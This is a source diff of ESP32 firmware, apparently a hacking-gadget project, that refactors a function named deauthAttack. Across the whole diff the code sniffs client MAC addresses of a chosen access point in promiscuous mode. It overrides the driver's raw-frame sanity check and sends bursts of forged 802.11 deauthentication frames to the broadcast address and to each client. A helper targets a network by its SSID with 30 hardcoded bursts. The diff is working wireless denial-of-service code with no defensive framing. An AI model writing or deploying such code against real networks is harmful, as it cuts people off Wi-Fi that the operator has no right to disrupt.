@@ -4,6 +4,10 @@
 std::vector<std::string> WifiService::sniffLog;
 portMUX_TYPE WifiService::sniffMux = portMUX_INITIALIZER_UNLOCKED;
 
+std::vector<std::array<uint8_t, 6>> WifiService::staList;
+uint8_t WifiService::apBSSID[6];
+portMUX_TYPE WifiService::staMux = portMUX_INITIALIZER_UNLOCKED;
+
 WifiService::WifiService() : connected(false) {
     WiFi.mode(WIFI_STA);
 }
@@ -366,122 +370,80 @@ std::string WifiService::getMacAddressAp() const {
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t)
 {
-    // 0 ⇒ “frame is OK” → the driver forwards it to the PHY
+    // Override function to avoid linker errors
     return 0;
 }
 
-
-static const uint8_t deauthTemplate[26] PROGMEM = {
-    0xC0, 0x00, 0x00, 0x00,                         // FC + duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // addr1 = broadcast
-    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,             // addr2 = BSSID (patch)
-    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,             // addr3 = BSSID (patch)
-    0x00, 0x00,                                     // seq-ctrl
-    0x07, 0x00                                      // reason code 7
-};
-
-static inline void macStrToBytes(const std::string& macStr, uint8_t mac[6])
-{
-    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
-}
-//------------------------------------------------------------------
-//  File-scope scratch that both normal code and the ISR can access
-//------------------------------------------------------------------
-static std::vector<std::array<uint8_t, 6>>  g_staList;
-static uint8_t                              g_apBssid[6];
-static portMUX_TYPE                         g_staMux = portMUX_INITIALIZER_UNLOCKED;
-
-//------------------------------------------------------------------
-//  ISR-safe promiscuous callback (no captures → plain C function)
-//------------------------------------------------------------------
-static void IRAM_ATTR clientSniffer(void* buf, wifi_promiscuous_pkt_type_t type)
+void WifiService::clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
     if (type != WIFI_PKT_DATA) return;
 
     const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
     const uint8_t* hdr = p->payload;
 
-    // To-DS = 1, From-DS = 0  ⇒ STA → AP
+    // To-DS = 1, From-DS = 0
     if ((hdr[1] & 0x03) != 0x01) return;
 
     const uint8_t* ap  = hdr + 4;   // addr1
     const uint8_t* sta = hdr +10;   // addr2
 
-    if (memcmp(ap, g_apBssid, 6) != 0) return;   // different BSSID
+    if (memcmp(ap, apBSSID, 6) != 0) return;   // different BSSID
 
     std::array<uint8_t,6> mac;
     memcpy(mac.data(), sta, 6);
 
-    portENTER_CRITICAL_ISR(&g_staMux);
+    portENTER_CRITICAL_ISR(&staMux);
     bool seen=false;
-    for (auto& e : g_staList) if (e == mac) { seen=true; break; }
-    if (!seen) g_staList.push_back(mac);
-    portEXIT_CRITICAL_ISR(&g_staMux);
+    for (auto& e : staList) if (e == mac) { seen=true; break; }
+    if (!seen) staList.push_back(mac);
+    portEXIT_CRITICAL_ISR(&staMux);
 }
 
-//------------------------------------------------------------------
-//  Collect client MACs of a given BSSID on its channel
-//------------------------------------------------------------------
-std::vector<std::array<uint8_t,6>>
-WifiService::getClientsOfBssid(const uint8_t bssid[6],
-                               uint8_t channel,
-                               uint32_t dwellMs)
+void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel, uint8_t bursts, uint32_t sniffMs)
 {
-    // reset scratch
-    memcpy(g_apBssid, bssid, 6);
-    g_staList.clear();
-
-    // hop + sniff
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_rx_cb(&clientSniffer);
-
-    uint32_t start = millis();
-    while (millis() - start < dwellMs) delay(1);
-
-    // stop sniff
-    esp_wifi_set_promiscuous(false);
-    esp_wifi_set_promiscuous_rx_cb(nullptr);
-
-    // copy out results (thread-safe)
-    std::vector<std::array<uint8_t,6>> out;
-    portENTER_CRITICAL(&g_staMux);
-    out = g_staList;
-    portEXIT_CRITICAL(&g_staMux);
-
-    return out;
-}
-void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel,
-                               uint8_t bursts, uint32_t sniffMs)
-{
-    // ① ensure AP interface exists (as discussed earlier)
     if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
         WiFi.mode(WIFI_MODE_AP);
         esp_wifi_start();
     }
 
-    // ② gather client MACs
-    auto clients = getClientsOfBssid(bssid, channel, sniffMs);
+    std::vector<std::array<uint8_t,6>> clients;
 
-    // ③ pre-build templates
+    memcpy(apBSSID, bssid, 6);
+    staList.clear();
+
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);
+
+    uint32_t start = millis();
+    while (millis() - start < sniffMs) delay(1);
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+    portENTER_CRITICAL(&staMux);
+    clients = staList;
+    portEXIT_CRITICAL(&staMux);
+
+    // Deauth frame
     uint8_t pkt[26] = {
-        0xc0,0x00, 0x00,0x00,
-        0xff,0xff,0xff,0xff,0xff,0xff,     // addr1 = broadcast (will swap for STA)
-        /* addr2 & addr3 set below */
-        0x00,0x00, 0x07,0x00
+        0xc0,0x00,                          // Frame control
+        0x00,0x00,                          // Duration
+        0xff,0xff,0xff,0xff,0xff,0xff,      // addr1 = target
+        0x00,0x00,0x00,0x00,0x00,0x00,      // addr2 = source
+        0x00,0x00,0x00,0x00,0x00,0x00,      // addr3 = BSSID
+        0x00,0x00,                          // Fragment & sequence number
+        0x02,0x00                           // Reason code, 2 = previous authentication no longer valid
     };
     memcpy(&pkt[16], bssid, 6);            // addr3 always AP
-    // send bursts
+
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-    for (uint8_t i=0;i<bursts;++i) {
-        // ③a broadcast
+    for (int i=0;i<bursts;i++) {
         memcpy(&pkt[10], bssid, 6);        // addr2 = AP
         memcpy(&pkt[4] , "\xff\xff\xff\xff\xff\xff",6);
         esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);
 
-        // ③b one unicast per client
         for (auto& sta: clients) {
             memcpy(&pkt[4],  sta.data(),6);  // addr1 = STA
             esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);
@@ -490,18 +452,15 @@ void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel,
     }
 }
 
-
-bool WifiService::deauthApBySsid(const std::string& ssid, uint8_t bursts, uint32_t sniffMs)
+bool WifiService::deauthApBySsid(const std::string& ssid)
 {
-    auto nets = scanDetailedNetworks();     // your existing scan helper
+    auto nets = scanDetailedNetworks();
     for (auto& n : nets) {
         if (n.ssid == ssid) {
             uint8_t bssid[6];
-            sscanf(n.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                   &bssid[0], &bssid[1], &bssid[2],
-                   &bssid[3], &bssid[4], &bssid[5]);
-
-            deauthAttack(bssid, n.channel, bursts, sniffMs);
+            sscanf(n.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+            // Hardcoded 30 bursts and 400ms sniffing time
+            deauthAttack(bssid, n.channel, 30, 400);
             return true;                    // success
         }
     }
